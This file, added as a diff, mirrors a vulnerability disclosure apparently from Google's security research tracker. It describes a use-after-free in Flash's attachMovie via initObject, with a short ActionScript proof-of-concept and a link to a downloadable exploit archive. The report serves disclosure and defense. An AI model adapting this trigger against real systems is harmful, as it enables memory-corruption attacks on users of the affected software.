@@ -1,0 +1,20 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=391&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There is a use-after-free in attachMovie due to the initObject. If the initObject contains an object that calls a method that deletes the movie clip that is being attached, a use-after-free occurs. A proof-of-concept is as follows:
+
+n = {_quality : {toString : func}};
+function func(){
+	
+	trace("hello");
+	
+	newResetButton.removeMovieClip();
+	return "test";
+	}
+	
+_root.attachMovie("myResetButton","newResetButton",200, n);
+
+A sample fla and swf are attached.
+
+Proof of Concept: 
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37865.zip
+
